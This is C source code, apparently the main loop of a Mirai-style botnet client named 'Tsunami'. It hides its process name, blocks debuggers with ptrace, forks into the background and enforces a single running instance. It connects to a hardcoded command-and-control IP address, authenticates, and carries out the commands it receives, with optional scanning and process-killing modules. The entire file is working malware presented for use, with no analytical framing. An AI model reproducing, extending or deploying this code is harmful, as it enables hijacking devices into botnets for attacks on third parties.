#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <sys/ptrace.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/rand.h"
#include "headers/utils.h"
#include "headers/entry.h"
#include "headers/resolve.h"
#ifdef TSUNAMI_COMMAND
#include "headers/command.h"
#endif
#ifdef TSUNAMI_KILLER
#include "headers/killer.h"
#endif
#ifdef TSUNAMI_SCAN
#include "headers/scan.h"
#endif

static int sock = -1;
static int bind_sock = -1;
static struct resolve *dns;
static BOOL connected = FALSE;

static void maintain_single_instance(void)
{
	struct sockaddr_in addr;
	int i = 1;
	static BOOL local_bind = TRUE;
	struct termination t;

	if((bind_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return;

	setsockopt(bind_sock, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i));
	fcntl(bind_sock, F_SETFL, O_NONBLOCK | fcntl(bind_sock, F_GETFL, 0));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(SINGLE_INSTANCE_PORT);
	addr.sin_addr.s_addr = local_bind ? INET_ADDR(127,0,0,1) : LOCAL_ADDRESS;

	// Build the termination header
	t.a = htons(11);
	t.b = htons(99);
	t.c = htons(82);
	t.d = htons(151);
	t.e = htons(200);
	t.f = htons(49);

	errno = 0;
	if(bind(bind_sock, (struct sockaddr_in *)&addr, sizeof(addr)) == -1)
	{
		if(errno == EADDRNOTAVAIL && local_bind)
		{
			local_bind = FALSE;
			maintain_single_instance();
			return;
		}
		errno = 0;
		// Connect to the instance to request termination
		if(connect(bind_sock, (struct sockaddr_in *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS)
		{
			#ifdef TSUNAMI_SCAN
			kill_scan();
			#endif
			kill(parent_gid * -1, 9);
			exit(0);
		}
		// Send the termination header to the instance
		if(send(bind_sock, &t, sizeof(t), MSG_NOSIGNAL) < 1)
		{
			#ifdef TSUNAMI_SCAN
			kill_scan();
			#endif
			kill(parent_gid * -1, 9);
			exit(0);
		}
		// Sleep for a small amount of time to release the old address from the previous bind
		sleep(5);
		// Recall to make sure we are in control
		maintain_single_instance();
		return;
	}

	if(listen(bind_sock, 1) == -1)
	{
		#ifdef TSUNAMI_SCAN
		kill_scan();
		#endif
		kill(parent_gid * -1, 9);
		exit(0);
	}

	return;
}

static void disconnect_connection(void)
{
	if(sock != -1)
		close(sock);
	sock = -1;
	if(dns)
		free(dns);
	connected = FALSE;
	sleep(10);
}

static void establish_connection(void)
{
	struct sockaddr_in dest_addr;

	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return;

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(CONTROL_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(203,159,80,75);

	fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0));

	connect(sock, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr));
	return;
}

int main(int argc, char **args)
{
	char rand_buf[32];
	int rand_name_len = 0;
	struct entry *ptr;
	uint8_t p = 0;
	BOOL c = FALSE;
	int i = 0;
	#ifndef DEBUG
	// ./.t
	char name_buf[4] = {0x2f, 0x2e, 0x74, 0x2e};
	#endif
	struct command_auth auth;

	auth.a = htons(128);
	auth.b = htons(90);
	auth.c = htons(87);
	auth.d = htons(200);
	auth.e = htons(240);
	auth.f = htons(30);

	#ifdef TSUNAMI_KILLER
	killer_boot();
	#endif

	util_null(auth.arch_buf, 0, 32);

	#ifdef BOT_ARCH
	util_memcpy(auth.arch_buf, BOT_ARCH, 32);
	#else
	util_memcpy(auth.arch_buf, "unknown", 7);
	#endif

	auth.arch_len = util_strlen(auth.arch_buf);
	auth.arch_len = htons(auth.arch_len);

	// Ignore signals from children and sighups
	signal(SIGCHLD, SIG_IGN);
	signal(SIGHUP, SIG_IGN);

	#ifndef DEBUG
	// Detect if any software has created a tracer at run-time used to detect any debugging software, ptrace() is universally accepted and was introduced in Unix version 6.
	if(ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
		// Failed to initlize a tracer?, return.
		return 1;
	#endif

	maintain_single_instance();

	// If we failed to initilize the bind socket just simply return.
	if(bind_sock == -1)
		return 1;

	init_rand();
	init_entrys();

	#ifndef DEBUG
	// Fork ourselfs into the background.
	if(fork() > 0)
		return 1;

	parent_gid = setsid();

	#endif

	LOCAL_ADDRESS = util_get_local_addr();

	#ifdef DEBUG
	printf("We have started under DEBUG mode!\n");
	#endif

	#ifndef DEBUG
	chdir("/");
	#endif

	#ifndef DEBUG
	rand_name_len = (((rand_new()) % 2) + 4) * 2;
	rand_string(rand_buf, rand_name_len);
	rand_buf[rand_name_len] = 0;
	for(i = 0; i < argc; i++)
		util_null(args[i], 0, util_strlen(args[i]));
	util_strcpy(args[0], "./");
	util_strcat(args[0], rand_buf);
	util_strcat(args[0], ".");
	#ifdef BOT_ARCH
	util_strcat(args[0], BOT_ARCH);
	#else
	util_strcat(args[0], "unknown");
	#endif
	rand_string(rand_buf, rand_name_len);
	rand_buf[rand_name_len] = 0;
	prctl(PR_SET_NAME, rand_buf);
	#endif

	#ifndef DEBUG
	ptr = retrieve_entry(ENTRY_SUCCESS_STRING);
	write(STDOUT, ptr->buf, ptr->data_len);
	write(STDOUT, "\n", 1);
	// Close st fds
	close(STDIN);
	close(STDOUT);
	close(STDERR);
	// We dont want a tracer to be externally attached from applications like strace for process debugging
	ptrace(PTRACE_TRACEME, 0, 0, 0);
	#endif

	#ifdef TSUNAMI_COMMAND
	init_commands();
	#endif

	#ifdef TSUNAMI_SCAN
	StartTheLelz();
	#endif

	while(TRUE)
	{
		fd_set read_set;
		fd_set write_set;
		struct timeval timeout;
		int ret = 0;
		int err = 0;
		socklen_t err_len = sizeof(err);
		int i = 0;
		char buf[DNS_TXT_MAX_SIZE];
		int max_fds = 0;
		struct termination t;

		FD_ZERO(&read_set);
		FD_ZERO(&write_set);

		if(sock == -1)
		{
			establish_connection();
		}

		// Check if the socket was correctly initlized
		if(sock == -1)
		{
			#ifdef DEBUG
			printf("Failed to initlize the command & control socket, retrying in 10 seconds\n");
			#endif
			disconnect_connection();
			continue;
		}

		if(errno == ENETUNREACH)
		{
			#ifdef DEBUG
			printf("Attempted to reach a unreachable command & control address, retrying in 10 seconds\n");
			#endif
			disconnect_connection();
			continue;
		}

		if(bind_sock != -1)
			FD_SET(bind_sock, &read_set);

		if(connected)
			FD_SET(sock, &read_set);
		else
			FD_SET(sock, &write_set);

		// Select maximum fds so we can control the bind socket and command & control socket
		if(bind_sock > sock)
			max_fds = bind_sock;
		else
			max_fds = sock;

		timeout.tv_usec = 0;
		timeout.tv_sec = 10;

		ret = select(max_fds + 1, &read_set, &write_set, NULL, &timeout);
		if(ret == -1)
		{
			continue;
		}
		// Only send "pings" if we are connected
		else if(ret == 0 && sock != -1 && connected)
		{
			p++;
			if(p % 6 == 0)
			{
				// Send a alive message to our command & control server
				send(sock, "\x09\x03\x02\x05\x08\x01", 6, MSG_NOSIGNAL);
				p = 0;
			}
			continue;
		}

		if(bind_sock != -1 && FD_ISSET(bind_sock, &read_set))
		{
			struct sockaddr_in addr;
			socklen_t addr_len = sizeof(addr);
			int fd = accept(bind_sock, (struct sockaddr_in *)&addr, &addr_len);
			int read = recv(fd, &t, sizeof(t), 0);
			
			if(read < 1)
				continue;

			// Unpack the header to read the contents
			t.a = ntohs(t.a);
			t.b = ntohs(t.b);
			t.c = ntohs(t.c);
			t.d = ntohs(t.d);
			t.e = ntohs(t.e);
			t.f = ntohs(t.f);

			if(t.a == 11 && t.b == 99 && t.c == 82 && t.d == 151 && t.e == 200 && t.f == 49)
			{
				#ifdef DEBUG
				printf("Successfully validated the process termination request, killing this current instance\n");
				#endif
				#ifdef TSUNAMI_SCAN
				kill_scan();
				#endif
				kill(parent_gid * -1, 9);
				exit(0);
			}

			// If we are here its possible somebody tried making a non-valid request to us in attempts to terminate our instance
			continue;
		}

		if(!FD_ISSET(sock, &write_set) && !connected)
		{
			#ifdef DEBUG
			printf("Failed to connect to the command & control server\n");
			#endif
			disconnect_connection();
			continue;
		}

		if(sock != -1 && !connected && FD_ISSET(sock, &write_set))
		{
			// Verify that the socket connected without any errors
			getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &err_len);
			if(err != 0)
			{
				#ifdef DEBUG
				printf("Error whilst connecting to the command & control server\n");
				#endif
				disconnect_connection();
				continue;
			}
			// Authenticate as a client
			send(sock, &auth, sizeof(struct command_auth), MSG_NOSIGNAL);
			#ifdef DEBUG
			printf("Successfully connected to the command & control server!\n");
			#endif
			connected = TRUE;
		}

		// Something readable?
		if(sock != -1 && connected && FD_ISSET(sock, &read_set))
		{
			char buf[1024];
			uint16_t len = 0;

			errno = 0;
			ret = recv(sock, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
			if(ret == -1)
			{
				if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
					continue;
				else
					ret = 0;
			}

			if(ret == 0)
			{
				#ifdef DEBUG
				printf("Disconnected from the command & control server?\n");
				#endif
				disconnect_connection();
				continue;
			}

			len = ntohs(len);

			// Alive request response from our command & control server
			if(len == 505)
			{
				recv(sock, &len, sizeof(len), MSG_NOSIGNAL);
				continue;
			}

			if(len > sizeof(buf))
			{
				disconnect_connection();
				continue;
			}

			errno = 0;
			ret = recv(sock, buf, len, MSG_NOSIGNAL | MSG_PEEK);
			if(ret == -1)
			{
				if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
					continue;
				ret = 0;
			}

			if(ret == 0)
			{
				#ifdef DEBUG
				printf("Disconnected from the command & control server?\n");
				#endif
				disconnect_connection();
				continue;
			}

			recv(sock, &len, sizeof(len), MSG_NOSIGNAL);
			len = ntohs(len);
			recv(sock, buf, len, MSG_NOSIGNAL);

			#ifdef DEBUG
			printf("Received %d bytes from the command & control server!\n", len);
			#endif

			#ifdef TSUNAMI_COMMAND
			if(len > 0)
				command_parse(buf, len);
			#endif
		}
	}
}
